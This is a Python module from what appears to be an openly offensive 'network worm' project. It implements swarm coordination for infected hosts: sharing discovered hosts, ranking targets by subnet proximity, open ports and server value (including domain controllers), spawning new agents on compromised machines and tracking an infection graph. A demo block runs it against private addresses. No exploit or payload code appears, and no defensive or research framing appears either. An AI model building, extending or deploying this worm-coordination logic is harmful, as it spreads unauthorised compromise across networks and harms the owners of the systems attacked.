"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Multi-Agent Swarm Intelligence
Coordinates multiple infected hosts as independent agents
"""


import threading
import time
import uuid
from collections import defaultdict
from typing import Dict, List, Set

from utils.logger import logger


class SwarmAgent:
    """
    Individual agent in the swarm
    Each infected host becomes an independent agent
    """

    def __init__(self, agent_id: str = None, role: str = "worker"):
        self.agent_id = agent_id or str(uuid.uuid4())
        self.role = role  # worker, coordinator, scout
        self.discovered_hosts = set()
        self.infected_hosts = set()
        self.shared_knowledge = {}
        self.neighbors = set()

        logger.info(f"Swarm agent initialized: {self.agent_id[:8]} (role: {role})")

    def discover_host(self, host_ip: str, host_info: Dict):
        """Add discovered host to knowledge base"""
        self.discovered_hosts.add(host_ip)
        self.shared_knowledge[host_ip] = host_info
        logger.debug(f"Agent {self.agent_id[:8]} discovered: {host_ip}")

    def report_infection(self, host_ip: str):
        """Report successful infection"""
        self.infected_hosts.add(host_ip)
        logger.success(f"Agent {self.agent_id[:8]} infected: {host_ip}")

    def add_neighbor(self, neighbor_id: str):
        """Add neighboring agent"""
        self.neighbors.add(neighbor_id)
        logger.debug(f"Agent {self.agent_id[:8]} connected to {neighbor_id[:8]}")

    def get_targets(self) -> Set[str]:
        """Get potential targets (discovered but not infected)"""
        return self.discovered_hosts - self.infected_hosts


class SwarmCoordinator:
    """
    Coordinates the swarm of agents
    Implements distributed decision-making
    """

    def __init__(self):
        self.agents = {}  # agent_id -> SwarmAgent
        self.global_knowledge = defaultdict(dict)
        self.infection_graph = defaultdict(set)
        self.lock = threading.Lock()

        logger.info("Swarm coordinator initialized")

    def register_agent(self, agent: SwarmAgent):
        """Register new agent in swarm"""
        with self.lock:
            self.agents[agent.agent_id] = agent
            logger.info(f"Agent registered: {agent.agent_id[:8]} (total: {len(self.agents)})")

    def share_knowledge(self, agent_id: str, knowledge: Dict):
        """
        Share knowledge between agents
        Implements distributed intelligence
        """
        with self.lock:
            for host_ip, host_info in knowledge.items():
                # Merge knowledge
                if host_ip not in self.global_knowledge:
                    self.global_knowledge[host_ip] = host_info
                else:
                    # Update with new information
                    self.global_knowledge[host_ip].update(host_info)

            logger.debug(f"Knowledge shared by {agent_id[:8]}: {len(knowledge)} hosts")

    def assign_targets(self, agent_id: str, count: int = 5) -> List[str]:
        """
        Assign targets to agent using swarm intelligence
        Avoids duplicate work
        """
        with self.lock:
            agent = self.agents.get(agent_id)
            if not agent:
                return []

            # Get all known hosts
            all_hosts = set(self.global_knowledge.keys())

            # Get all infected hosts (from all agents)
            all_infected = set()
            for a in self.agents.values():
                all_infected.update(a.infected_hosts)

            # Get potential targets
            potential_targets = all_hosts - all_infected

            # Prioritize targets using swarm intelligence
            # Prefer targets close to this agent's network
            prioritized = self._prioritize_targets(agent, potential_targets)

            # Assign top N targets
            assigned = list(prioritized)[:count]

            logger.info(f"Assigned {len(assigned)} targets to agent {agent_id[:8]}")
            return assigned

    def _prioritize_targets(self, agent: SwarmAgent, targets: Set[str]) -> List[str]:
        """
        Prioritize targets based on:
        - Network proximity
        - Vulnerability score
        - Strategic value
        """
        scored_targets = []

        for target in targets:
            score = 0
            target_info = self.global_knowledge.get(target, {})

            # Network proximity (same subnet = higher score)
            if agent.infected_hosts:
                agent_subnet = list(agent.infected_hosts)[0].rsplit(".", 1)[0]
                target_subnet = target.rsplit(".", 1)[0]
                if agent_subnet == target_subnet:
                    score += 10

            # Vulnerability score
            open_ports = target_info.get("open_ports", [])
            score += len(open_ports) * 2

            # Strategic value (servers, domain controllers, etc.)
            if target_info.get("is_server"):
                score += 20

            scored_targets.append((score, target))

        # Sort by score (descending)
        scored_targets.sort(reverse=True)

        return [target for score, target in scored_targets]

    def update_infection_graph(self, infector_id: str, infected_ip: str):
        """Track infection propagation graph"""
        with self.lock:
            self.infection_graph[infector_id].add(infected_ip)

    def get_swarm_statistics(self) -> Dict:
        """Get swarm statistics"""
        with self.lock:
            total_infected = set()
            total_discovered = set()

            for agent in self.agents.values():
                total_infected.update(agent.infected_hosts)
                total_discovered.update(agent.discovered_hosts)

            return {
                "total_agents": len(self.agents),
                "total_infected": len(total_infected),
                "total_discovered": len(total_discovered),
                "infection_rate": (
                    len(total_infected) / len(total_discovered) if total_discovered else 0
                ),
                "avg_infections_per_agent": (
                    len(total_infected) / len(self.agents) if self.agents else 0
                ),
            }

    def elect_coordinator(self) -> str:
        """
        Elect a coordinator agent
        Uses simple election based on most infections
        """
        with self.lock:
            if not self.agents:
                return None

            # Find agent with most infections
            best_agent = max(self.agents.values(), key=lambda a: len(a.infected_hosts))

            best_agent.role = "coordinator"
            logger.info(f"Elected coordinator: {best_agent.agent_id[:8]}")

            return best_agent.agent_id

    def spawn_new_agent(self, parent_id: str, infected_host: str) -> SwarmAgent:
        """
        Spawn new agent on infected host
        Implements swarm division
        """
        # Create new agent
        new_agent = SwarmAgent(role="worker")
        new_agent.infected_hosts.add(infected_host)

        # Inherit knowledge from parent
        parent = self.agents.get(parent_id)
        if parent:
            new_agent.shared_knowledge = parent.shared_knowledge.copy()
            new_agent.add_neighbor(parent_id)
            parent.add_neighbor(new_agent.agent_id)

        # Register new agent
        self.register_agent(new_agent)

        logger.success(f"Spawned new agent {new_agent.agent_id[:8]} on {infected_host}")
        return new_agent


class SwarmBehavior:
    """
    Implements swarm behaviors
    Emergent intelligence from simple rules
    """

    @staticmethod
    def should_divide(agent: SwarmAgent, threshold: int = 5) -> bool:
        """
        Decide if agent should divide (spawn new agent)

        Args:
            agent: Agent to check
            threshold: Minimum infections before division

        Returns:
            True if should divide
        """
        return len(agent.infected_hosts) >= threshold

    @staticmethod
    def should_explore(agent: SwarmAgent) -> bool:
        """Decide if agent should explore new networks"""
        # Explore if few targets remaining
        targets = agent.get_targets()
        return len(targets) < 3

    @staticmethod
    def should_coordinate(agent: SwarmAgent) -> bool:
        """Decide if agent should coordinate with neighbors"""
        # Coordinate if has many neighbors
        return len(agent.neighbors) >= 3


if __name__ == "__main__":
    # Test swarm system
    coordinator = SwarmCoordinator()

    print("=" * 60)
    print("MULTI-AGENT SWARM TEST")
    print("=" * 60)

    # Create initial agent
    agent1 = SwarmAgent(role="coordinator")
    coordinator.register_agent(agent1)

    # Simulate discoveries
    agent1.discover_host("192.168.1.100", {"open_ports": [22, 80]})
    agent1.discover_host("192.168.1.101", {"open_ports": [445]})
    agent1.discover_host("192.168.1.102", {"open_ports": [3389]})

    # Share knowledge
    coordinator.share_knowledge(agent1.agent_id, agent1.shared_knowledge)

    # Simulate infection
    agent1.report_infection("192.168.1.100")

    # Spawn new agent
    agent2 = coordinator.spawn_new_agent(agent1.agent_id, "192.168.1.100")

    # Get statistics
    stats = coordinator.get_swarm_statistics()

    print(f"\nSwarm Statistics:")
    print(f"  Total Agents: {stats['total_agents']}")
    print(f"  Total Infected: {stats['total_infected']}")
    print(f"  Total Discovered: {stats['total_discovered']}")
    print(f"  Infection Rate: {stats['infection_rate']:.1%}")

    # Assign targets
    targets = coordinator.assign_targets(agent2.agent_id, count=3)
    print(f"\nTargets assigned to agent 2: {targets}")

    print("=" * 60)
